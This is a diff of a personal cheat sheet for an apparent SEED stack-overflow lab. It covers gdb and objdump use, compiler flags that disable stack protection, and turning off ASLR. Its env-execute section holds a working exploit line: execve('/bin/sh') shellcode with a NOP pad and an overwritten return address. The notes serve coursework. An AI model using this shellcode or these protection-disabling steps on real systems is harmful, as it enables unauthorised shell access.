@@ -1,38 +1,19 @@
 # A sheet for later use
 
-## gdb example
+gdb 들어간다음에
+disass main 해서 문제가 되는 함수의 호출부분을 찾는다.
+그 다음 라인이 함수 복귀 주소
+
+
+## gcc
 ```
-# run gdb quietly
-gdb -q date
+gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
 
-# set break point and run
-set args “--help”
-break __libc_start_main
-run
-
-# Investigate memory
-frame
-bt
-info frame
-info registers
-x /16xw $esp
-set *{start} = 0x20554c42
-
-x/s ans_buf
-x/xw &ans_flag
-x/32xw &esp
+-fno-stack-protector : disables stack protection. Asks the compiler not to add the StackGuard protection.
+-g : default debug information
+-o : set output file name
+-z execstack : marks the stack as executable
 ```
-
-## env execute
-```
-env -i PWD="/home/seed/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/stack_addresses/ans_check5 <param>
-env -i PWD="/home/seed/labs/lab3/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/523/labs/lab3/stack_addresses/ans_check5 <param>
-unset env LINES
-unset env COLUMNS
-break 
-run $( python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90'*24 + '\x6c\xfd\xff\xbf'")
-```
-
 
 ## objdump
 ```
@@ -48,14 +29,52 @@ objdump -D ans_check5 | grep -B 1 exit
 ```
 
 
-## gcc
-```
-gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
+## To disable ASLR
+0 (disabled), or 1 or 2(enabled)
+cat /proc/sys/kernel/randomize_va_space # Write down val
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
--fno-stack-protector : disables stack protection
--g : default debug information
--o : set output file name
--z execstack : marks the stack as executable
+## gdb example
+```
+# run gdb quietly
+gdb -q <program>
+
+# set break point and run
+set args “--help”
+break __libc_start_main
+break *0x08048534 : Using address directly, type *
+run
+
+# disassemble function. To find out the address of the function
+disass <function name>
+
+# Investigate memory
+frame
+bt
+info frame
+info registers
+x /16xw $esp
+set *{start} = 0x20554c42
+
+x/s ans_buf
+x/xw &ans_flag
+x/32xw $esp
+```
+
+## env execute
+```
+# command line execution
+env -i PWD="/home/seed/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/stack_addresses/ans_check5 <param>
+
+# gdb execution
+env -i PWD="/home/seed/labs/lab3/stack_addresses" SHELL="/bin/bash" SHLVL=0 gdb /home/seed/523/labs/lab3/stack_addresses/ans_check5
+unset env LINES
+unset env COLUMNS
+break 
+run $( python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90'*22 + '\x8e\xfd\xff\xbf'")
+x/32xw $esp
+c
+x/32xw $esp
 ```
 
 
